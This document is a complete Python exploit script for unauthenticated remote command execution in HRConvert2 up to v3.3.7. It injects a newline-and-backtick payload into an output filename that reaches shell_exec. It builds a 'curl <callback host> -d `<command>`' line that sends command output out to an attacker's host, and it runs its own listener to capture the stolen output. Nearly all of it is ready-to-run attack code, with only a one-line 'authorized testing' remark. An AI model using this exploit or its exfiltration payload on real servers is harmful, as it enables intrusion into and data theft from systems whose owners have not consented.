#!/usr/bin/env python3
"""
HRConvert2 <= v3.3.7 - Unauthenticated Remote Command Execution
Out-of-band (OOB) command-execution exfiltration PoC / EXP.

Vulnerable code path:
    convertCore.php : sanitizeString() fails to strip the backtick (`) and the
    tab (\\t).  userconvertfilename reaches shell_exec('ffmpeg -y -i ...') via
    convertFiles() -> convertAudio() without escapeshellarg(), so a backtick
    command substitution in the output filename is executed as www-data.

Exfiltration technique (works around the heavy blacklist filter):
    Only these characters survive sanitizeString(): alnum, _ ` TAB NL CR ? = + , - .
    There is no > | $ ( ) & ; " ' * /, so classic redirection / pipes are gone.
    We therefore:
      1. break out of the ffmpeg command with a newline (newline is NOT filtered),
      2. run `IFS=` so the shell stops word-splitting our command output (this is
         what lets multi-word output survive intact),
      3. send the output to our listener with `curl -d` (POST body = full output).
    The listener must be the callback host on TCP/80, because the colon needed
    for `host:port` is stripped from the payload.

    Injected userconvertfilename:
        <base>\\nIFS=\\ncurl\\t<CALLBACK_HOST>\\t-d\\t`<COMMAND>`

Authorized testing only.
"""
import argparse
import http.server
import re
import socketserver
import sys
import threading
import time

import requests

DEFAULT_URL = "http://127.0.0.1:8080/HRProprietary/HRConvert2/convertCore.php"
DEFAULT_COMMAND = "id"
DEFAULT_EXTENSION = "mp3"
# Characters removed by sanitizeString(); they must not appear in --command.
BLACKLIST = set("|\\~#[](){};:$!#^&%@>*<\"'/ ")


# --------------------------------------------------------------------------- #
# OOB listener
# --------------------------------------------------------------------------- #
class _ReuseTCPServer(socketserver.TCPServer):
    allow_reuse_address = True


def start_listener(bind: str, port: int, sink) -> socketserver.TCPServer:
    class Handler(http.server.BaseHTTPRequestHandler):
        def _read(self) -> bytes:
            n = int(self.headers.get("Content-Length", 0) or 0)
            return self.rfile.read(n)

        def _reply(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")

        def do_POST(self):
            body = self._read().decode("utf-8", "replace")
            sink(body)
            self._reply()

        def do_GET(self):
            sink(self.path)
            self._reply()

        def log_message(self, *args):
            pass

    srv = _ReuseTCPServer((bind, port), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


# --------------------------------------------------------------------------- #
# Target interaction
# --------------------------------------------------------------------------- #
def get_tokens(session: requests.Session, url: str, timeout: float):
    r = session.get(url, timeout=timeout)
    r.raise_for_status()
    t1 = re.search(r"name=['\"]Token1['\"]\s+value=['\"]([^'\"]+)['\"]", r.text)
    t2 = re.search(r"name=['\"]Token2['\"]\s+value=['\"]([^'\"]+)['\"]", r.text)
    if not t1 or not t2:
        raise RuntimeError("could not parse Token1/Token2 from the page")
    return t1.group(1), t2.group(1)


def upload_file(session, url, token1, token2, filename, data, timeout):
    files = {"file": (filename, data, "audio/mpeg")}
    r = session.post(url, data={"Token1": token1, "Token2": token2},
                     files=files, timeout=timeout)
    r.raise_for_status()
    return r


def trigger(session, url, token1, token2, selected, extension, payload, timeout):
    data = {"Token1": token1, "Token2": token2, "convertSelected": selected,
            "extension": extension, "userconvertfilename": payload}
    t0 = time.time()
    r = session.post(url, data=data, timeout=timeout)
    return time.time() - t0, r


# --------------------------------------------------------------------------- #
# Payload
# --------------------------------------------------------------------------- #
def build_payload(callback_host: str, command: str) -> str:
    cmd = command.replace(" ", "\t")          # sanitizeString turns " " into "_"; tab survives
    return "poc\nIFS=\ncurl\t" + callback_host + "\t-d\t`" + cmd + "`"


def check_command(command: str):
    bad = sorted(set(command) & BLACKLIST)
    if bad:
        print(f"[!] warning: command contains filtered chars {bad}; they will be "
              f"stripped by sanitizeString and the command may break.", file=sys.stderr)
    if "`" in command:
        print("[!] warning: command contains a backtick; it will break the wrapper.",
              file=sys.stderr)


def gen_mp3(path: str) -> bytes:
    return b"ID3\x03\x00\x00\x00\x00\x00\x00"


# --------------------------------------------------------------------------- #
def main():
    ap = argparse.ArgumentParser(
        description="HRConvert2 <= v3.3.7 unauth RCE OOB exfil PoC",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    ap.add_argument("-u", "--url", default=DEFAULT_URL, help="convertCore.php URL")
    ap.add_argument("-c", "--command", default=DEFAULT_COMMAND,
                    help="command to execute on the target (no filtered chars)")
    ap.add_argument("-C", "--callback-host", required=True,
                    help="host/IP the target connects back to on TCP/80 (no scheme, no port)")
    ap.add_argument("--listen", action="store_true",
                    help="also start a local listener to capture/print the exfiltrated output")
    ap.add_argument("--listen-bind", default="0.0.0.0", help="listener bind address")
    ap.add_argument("--listen-port", type=int, default=80,
                    help="listener port (the target can only reach TCP/80 because ':' is filtered)")
    ap.add_argument("-f", "--source", default=None, help="input file to upload (default: tiny mp3)")
    ap.add_argument("-e", "--extension", default=DEFAULT_EXTENSION, help="conversion extension")
    ap.add_argument("--timeout", type=float, default=60.0, help="HTTP timeout (seconds)")
    ap.add_argument("--insecure", action="store_true", help="do not verify TLS")
    args = ap.parse_args()

    check_command(args.command)

    captured = []

    def sink(body: str):
        captured.append(body)
        print(f"[+] OOB callback body: {body!r}")

    srv = None
    if args.listen:
        try:
            srv = start_listener(args.listen_bind, args.listen_port, sink)
            print(f"[*] listener up on {args.listen_bind}:{args.listen_port}")
        except PermissionError:
            print(f"[!] cannot bind {args.listen_bind}:{args.listen_port} (need root for :80); "
                  f"run as root or use an external listener", file=sys.stderr)

    payload = build_payload(args.callback_host, args.command)
    print(f"[*] target        : {args.url}")
    print(f"[*] callback host : {args.callback_host}:80")
    print(f"[*] command       : {args.command}")
    print(f"[*] payload       : {payload!r}")

    session = requests.Session()
    session.trust_env = False
    if args.insecure:
        session.verify = False

    token1, token2 = get_tokens(session, args.url, args.timeout)
    print(f"[*] Token1={token1}  Token2={token2}")

    if args.source:
        with open(args.source, "rb") as fh:
            data = fh.read()
        filename = args.source.split("/")[-1]
    else:
        data = gen_mp3("/tmp/sample.mp3")
        filename = f"sample.{args.extension}"
    up = upload_file(session, args.url, token1, token2, filename, data, args.timeout)
    print(f"[*] upload        : HTTP {up.status_code}")

    dt, r = trigger(session, args.url, token1, token2, filename, args.extension,
                    payload, args.timeout)
    print(f"[*] convert       : HTTP {r.status_code} in {dt:.2f}s")

    if args.listen:
        time.sleep(2.0)
        if captured:
            out = captured[-1]
            if out.endswith("." + args.extension):
                out = out[: -(len(args.extension) + 1)]
            print(f"[+] exfiltrated output:\n{out}")
        else:
            print("[-] no callback received (check callback-host/port 80 reachability)")
        if srv:
            srv.shutdown()
    else:
        print("[*] waiting briefly for the callback...")
        time.sleep(2.0)
        if captured:
            print(f"[+] exfiltrated output: {captured[-1]!r}")
        else:
            print("[*] no local listener; collect the POST body from your "
                  f"{args.callback_host}:80 listener.")


if __name__ == "__main__":
    main()
